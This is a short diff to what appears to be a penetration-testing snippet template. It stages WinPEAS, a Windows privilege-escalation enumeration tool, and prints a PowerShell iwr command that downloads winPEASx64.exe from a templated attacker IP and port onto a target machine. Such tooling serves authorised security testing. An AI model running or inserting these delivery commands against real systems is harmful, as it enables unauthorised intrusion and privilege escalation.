@@ -6,7 +6,7 @@ metadata:
   author: "Unknown"
 
 content: |
-  mkdir -p packstation/outbound; cp -n /usr/share/peass/winpeas/* packstation/outbound; \
+  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/winpeas/* packstation/outbound; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
   echo 'Deliver only (x64): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx64.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
